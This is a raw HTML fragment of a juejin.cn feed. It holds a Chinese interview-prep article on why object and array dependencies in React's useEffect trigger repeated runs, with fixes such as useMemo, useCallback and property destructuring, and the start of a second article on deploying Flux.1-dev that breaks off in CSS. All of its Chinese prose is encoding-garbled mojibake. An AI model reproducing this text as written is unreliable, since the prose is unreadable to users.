content="ç™¾ç½¹é¸Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/1838039173172072"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€react é«˜é¢‘é¢è¯•é¢˜â€”æ ¸å¿ƒåŸç†ç¯‡ã€‘ï¼šuseEffect çš„ä¾èµ–é¡¹å¦‚æœæ˜¯æ•°ç»„æˆ–å¯¹è±¡ï¼ˆå¼•ç”¨ç±»å‹ï¼‰ï¼Œä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿå¦‚ä½•è§£å†³ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1838039173172072/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç™¾ç½¹é¸Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T15:47:42.000Z" title="Mon Dec 29 2025 15:47:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">é¢è¯•å®˜æé—®ï¼šuseEffect çš„ä¾èµ–é¡¹å¦‚æœæ˜¯æ•°ç»„æˆ–å¯¹è±¡ï¼ˆå¼•ç”¨ç±»å‹ï¼‰ï¼Œä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿå¦‚ä½•è§£å†³ï¼Ÿ</h3>
<h4 data-id="heading-1">ğŸ’¡ æ ¸å¿ƒå›ç­”æŠ€å·§</h4>
<p>è¿™é“é¢˜è€ƒå¯Ÿçš„æ˜¯ä¸¤ä¸ªæ ¸å¿ƒç‚¹ï¼š</p>
<ol>
<li><strong>React ä¾èµ–æ£€æŸ¥æœºåˆ¶</strong>ï¼šä½¿ç”¨çš„æ˜¯ <code>Object.is</code>ï¼ˆæµ…æ¯”è¾ƒï¼‰ã€‚</li>
<li><strong>é—­åŒ…é™·é˜±ä¸æ­»å¾ªç¯</strong>ï¼šå¼•ç”¨ç±»å‹åœ°å€æ”¹å˜å¯¼è‡´çš„ä¸å¿…è¦æ¸²æŸ“æˆ–æ— é™å¾ªç¯ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-2">1. é—®é¢˜çš„æœ¬è´¨ï¼šæµ…æ¯”è¾ƒï¼ˆShallow Comparisonï¼‰</h3>
<p>React åœ¨æ¯æ¬¡æ¸²æŸ“åä¼šå¯¹æ¯” <code>useEffect</code> çš„ <code>deps</code> æ•°ç»„ã€‚ å¯¹äºåŸºæœ¬ç±»å‹ï¼ˆstring, number, booleanï¼‰ï¼Œæ¯”è¾ƒçš„æ˜¯<strong>å€¼</strong>ã€‚ å¯¹äºå¼•ç”¨ç±»å‹ï¼ˆObject, Array, Functionï¼‰ï¼Œæ¯”è¾ƒçš„æ˜¯<strong>å†…å­˜åœ°å€</strong>ã€‚</p>
<p><strong>å…¸å‹é”™è¯¯åœºæ™¯ï¼š</strong></p>
<p>JavaScript</p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">UserProfile</span>() {
  const <span class="hljs-selector-attr">[count, setCount]</span> = <span class="hljs-built_in">useState</span>(<span class="hljs-number">0</span>);
  
  <span class="hljs-comment">// æ¯æ¬¡ç»„ä»¶é‡æ–°æ¸²æŸ“ï¼Œoptions éƒ½ä¼šè¢«é‡æ–°åˆ›å»ºï¼ŒæŒ‡å‘ä¸€ä¸ªæ–°çš„å†…å­˜åœ°å€</span>
  const options = { id: <span class="hljs-number">1</span> }; 

  <span class="hljs-built_in">useEffect</span>(() =&gt; {
    console<span class="hljs-selector-class">.log</span>('æ‰§è¡Œäº†ï¼');
  }, <span class="hljs-selector-attr">[options]</span>); <span class="hljs-comment">// å³ä½¿ options çš„å†…å®¹æ²¡å˜ï¼Œåœ°å€å˜äº†ï¼ŒuseEffect å°±ä¼šè§¦å‘</span>
}
</code></pre>
<p>å¦‚æœ <code>useEffect</code> å†…éƒ¨åˆè§¦å‘äº†çŠ¶æ€æ›´æ–°ï¼Œå°±ä¼šå¯¼è‡´<strong>æ— é™æ­»å¾ªç¯</strong>ã€‚</p>
<h3 data-id="heading-3">2. è§£å†³æ–¹æ¡ˆæœ‰å“ªäº›ï¼Ÿ</h3>
<h4 data-id="heading-4">æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨ <code>useMemo</code> æˆ– <code>useCallback</code></h4>
<p>è¿™æ˜¯æœ€æ­£ç»Ÿçš„æ–¹æ³•ï¼Œå°†å¼•ç”¨ç±»å‹â€œæŒä¹…åŒ–â€ã€‚</p>
<ul>
<li><code>useMemo</code>ï¼šç¼“å­˜å¯¹è±¡/æ•°ç»„ã€‚</li>
<li><code>useCallback</code>ï¼šç¼“å­˜å‡½æ•°ã€‚</li>
</ul>
<p>JavaScript</p>
<pre><code class="hljs language-scss" lang="scss">const options = <span class="hljs-built_in">useMemo</span>(() =&gt; ({ id: <span class="hljs-number">1</span> }), <span class="hljs-selector-attr">[]</span>); 
<span class="hljs-comment">// åªè¦ä¾èµ–é¡¹ä¸å˜ï¼Œoptions çš„å¼•ç”¨åœ°å€åœ¨å¤šæ¬¡æ¸²æŸ“é—´ä¿æŒä¸å˜</span>
</code></pre>
<h4 data-id="heading-5">æ–¹æ¡ˆäºŒï¼šå±æ€§æ‹†è§£ï¼ˆæ¨èï¼‰</h4>
<p>å¦‚æœå¯¹è±¡å¾ˆå¤§ï¼Œä½†æˆ‘åªå…³å¿ƒå…¶ä¸­çš„æŸä¸ªå±æ€§ï¼Œç›´æ¥æŠŠè¯¥å±æ€§æ”¾å…¥ä¾èµ–é¡¹ã€‚</p>
<p>JavaScript</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">useEffect</span>(() =&gt; {
  <span class="hljs-comment">// ä¸šåŠ¡é€»è¾‘</span>
}, <span class="hljs-selector-attr">[options.id]</span>); <span class="hljs-comment">// ç›‘å¬åŸºæœ¬ç±»å‹ idï¼Œè€Œä¸æ˜¯æ•´ä¸ªå¯¹è±¡</span>
</code></pre>
<h4 data-id="heading-6">æ–¹æ¡ˆä¸‰ï¼šä½¿ç”¨ <code>useRef</code></h4>
<p>å¦‚æœè¿™ä¸ªå˜é‡ä¸éœ€è¦å‚ä¸æ¸²æŸ“ï¼ˆå³å®ƒçš„æ”¹å˜ä¸éœ€è¦è§¦å‘ UI æ›´æ–°ï¼‰ï¼Œå¯ä»¥ç”¨ <code>useRef</code> å­˜å‚¨ã€‚<code>useRef</code> è¿”å›çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡å¼•ç”¨ã€‚</p>
<h4 data-id="heading-7">æ–¹æ¡ˆå››ï¼šå¯¹äºå‡½æ•°ï¼Œå†™åœ¨ useEffect å†…éƒ¨</h4>
<p>å¦‚æœå‡½æ•°åªåœ¨æ•ˆåº”å†…éƒ¨ä½¿ç”¨ï¼Œç›´æ¥ç§»è¿›å»ï¼Œé¿å…å°†å…¶ä½œä¸ºä¾èµ–ã€‚</p>
<hr/>
<h3 data-id="heading-8">3. è¿›é˜¶è¿½é—®ï¼šå¦‚æœä¸å°å¿ƒé€ æˆäº†æ­»å¾ªç¯ï¼Œè¯¥å¦‚ä½•æ’æŸ¥ï¼Ÿ</h3>
<ul>
<li><strong>React DevTools</strong>ï¼šæŸ¥çœ‹å“ªä¸ª Hook çš„æ•°æ®ä¸€ç›´åœ¨è·³åŠ¨ã€‚</li>
<li><strong>æ—¥å¿—å¤§æ³•</strong>ï¼šåœ¨ <code>useEffect</code> ç¬¬ä¸€è¡Œæ‰“ <code>console.log</code>ï¼Œçœ‹è§¦å‘é¢‘ç‡ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-9">ğŸŒŸ æ€»ç»“</h3>
<blockquote>
<p>â€œ<code>useEffect</code> çš„ä¾èµ–é¡¹å¯¹æ¯”æ‰§è¡Œçš„æ˜¯<strong>æµ…æ¯”è¾ƒ</strong>ã€‚å¯¹äºå¼•ç”¨ç±»å‹ï¼Œå³ä½¿å†…å®¹ä¸€è‡´ï¼Œåªè¦å†…å­˜åœ°å€æ”¹å˜ï¼Œæ•ˆåº”å°±ä¼šé‡æ–°æ‰§è¡Œã€‚è§£å†³åŠæ³•é€šå¸¸æ˜¯ä½¿ç”¨ <code>useMemo/useCallback</code> <strong>å†»ç»“å¼•ç”¨</strong>ï¼Œæˆ–è€…<strong>æ‹†è§£å±æ€§</strong>ï¼Œç¡®ä¿åªæœ‰å½“çœŸæ­£ç›¸å…³çš„æ•°æ®å˜åŒ–æ—¶ï¼Œæ‰è§¦å‘é€»è¾‘ã€‚â€</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å®¹å™¨åŒ–éƒ¨ç½² Flux.1-dev æ–‡ç”Ÿå›¾æ¨¡å‹åº”ç”¨ | å…±ç»©ç®—åŠ›]]></title>    <link>https://juejin.cn/post/7589201772133040169</link>    <guid>https://juejin.cn/post/7589201772133040169</guid>    <pubDate>2025-12-30T01:56:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589201772133040169" data-draft-id="7589172193151057956" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å®¹å™¨åŒ–éƒ¨ç½² Flux.1-dev æ–‡ç”Ÿå›¾æ¨¡å‹åº”ç”¨ | å…±ç»©ç®—åŠ›"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,LLM,å›¾ç‰‡èµ„æº"/> <meta itemprop="datePublished" content="2025-12-30T01:56:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeonGao"/> <meta itemprop="url" content="https://juejin.cn/user/3976252950591149"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å®¹å™¨åŒ–éƒ¨ç½² Flux.1-dev æ–‡ç”Ÿå›¾æ¨¡å‹åº”ç”¨ | å…±ç»©ç®—åŠ›
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3976252950591149/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeonGao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T01:56:11.000Z" title="Tue Dec 30 2025 01:56:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body{overflow:hidden;line-height:1.75;font-size:15px;background-image:linear-gradient(90deg,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0),linear-gradient(1turn,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0);background-size:20px 20px;background-position:50%;padding-top:0!important}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{position:relative;display:flex;border-bottom:5px solid #6d4e00;line-height:35px;letter-spacing:1px;font-size:25px;padding-left:25px;color:#664900;text-shadow:1px 1px 1px #8a6200;padding-bottom:0}.markdown-body h1:before{content:"";display:flex;position:absolute;left:0;top:3px;bottom:0;margin:auto;width:20px;height:20px;background-size:20px 20px;background-image:url("data:image/png;base64,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")}.markdown-body h2{position:relative;padding:0 0 0 20px;font-size:20px;font-weight:700;color:#614500}.markdown-body h2:before{content:"";position:absolute;top:3px;bottom:0;left:0;background-image:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAMAAACahl6sAAAAQlBMVEVHcEwlRnqtZBj76q4lRnolRnolRnolRnolRnokRnr/gGtrVUeLXDBKTl+hYSHasW7Ik0zs0JG4dCvUdEE0SW+rYxrLQJfjAAAACnRSTlMA////0H/xUaMi5MCoTwAACfVJREFUeNrtnQl3qygUgJ9GXAqosfL//+pgmgXwXmRNJGdu55xO+6rx8+6I8O9fehmGriN93zdN07bVXdpW/ih/SbpuGP6dXbpOXv7z2i3S9ISck2eQOnAhMHG64VQQbmrAaM4B05GmipaGdB+m6BNQPBXzMYtKR3EPbB/RS5eY4g+lIW9WBqnySCvVMrzRpqqs0g9nwVg5p1KYlHEchRT5bftp+y3n6xlQDjAkABtrKULU9f377ev+4/1/NiT+URRiZRhrcZP6WLa/Gq005BORaqXsdYEuHPIP798ZxSyt6d5sVfxJESRCsvB32lfXwhRjnUBGmKXNoJQe04VIASJqRC/9G7yDsyQMiloYz+0pHYghEoPISAGgpDSvHsCoMwmA0mfjSG5UOsqah2RodkljzMkhZZdamiEDB8+Nsbk9T04yGNljDXGOZZ6u0+Tj9DuvbyNJBuPO0ABtLNPlJtfZJ4CNNCWJoY8gddwxNpm9YrHh9DEkBoeMud4Kma8XRZaYpBJOYvg59U9wOsblMvmGrzQe30dyqFZ1dxPfO0FT5BOdw989THVs4q1TFk+iN4PMu7CaLpd4EJOExNaJLE4d0xQKYpJ0cY5Ozcwwu6WOu2cs9TUYxPB4b4fvLRzTUXbT1HH7y0BnB0j6CAehkPFfFzd1TMsi6sU1/P4VM9NiISHBlYnBMR+kad075sXlmMehj1twnfTUqJH4GJfqIKte7S72emPnHbdiYHIB0e6ATjKq1UoTaFh6wBL2csMIVo9fH/v6QRHAgoxrOHQQxG/36tC1ODmGOeBGBRmXalgcdhDQ1xF1vI6a3DF2d4r7G1enOUgNOshlFq7qUCxrca9ldiCam7ilxRbP6JbOYsYtfLFmkcXEgLG1DN/6eroxHjqh5bh+Uw27e1oWVK7pN+AqwzUcq/UYTPw8nWufLFBHN2zcxLRYlmGPs6rA2Wy0uJe/E7TknbHIa1WH1bLA8DAj3JpxET+FCNCWZ5uNT6jxTPZK/1mXoCBeKlGLRT2lP69XN3XdqqCojKX1ZVda6iD2McjeXSHa0I+AHd2InGAJgjRVM6gOBfygDrarRJnho6eQBbrns+HkcNUCWtYClJa66qFgPbqqZEBTCOAgRqxCOhQBWpZeIC6QBq91hEoI5unTjsMsK9DCFigY9WNn19hgVCrELalrTw6WnYMYzjHhQ2/7G2xTx1HvwpzSe4cVi5ORQQwMW9+72FU5L4gGsa6Yu1RcDeIhs64Qs8izt0vGH+n9/IKaIlYpM2UqkYOrwwq5CgBjWpyGtxaonxe4KaJ3hx+7O0HaqVkxLBPj8FmBVmjNevIUFhUuDmMq5NDV9RwyPe/95IvxAhG7ymqxHGE5sZJL2kPLUhUinkXfrnFwGFwXD99djNLSFh/meXEb2B6Oyiwm0I7BC+OlTlOVPk9K8CIYzu5YHwKDTI6XAo5lz3WEqEXwQRKhh5cyLa6D81P4PXBw984as9YaGXHwx4Ba8rmOldUat/BHt9cQ38AaljnBdCJqs60OcXVDJZP//ZwSWtV9FpHNtgg22KuYx/U2tB5Mcp1TYOiphNhiFjgWeJ3DL2OZpuuUisIoUyzZEJ76I+LmyqWdv8LwnEiwMYczihjxeqtBsuFJSTg2oD1ETQx4v6D1VleSZW1xCwvAfVGWpQ069kgr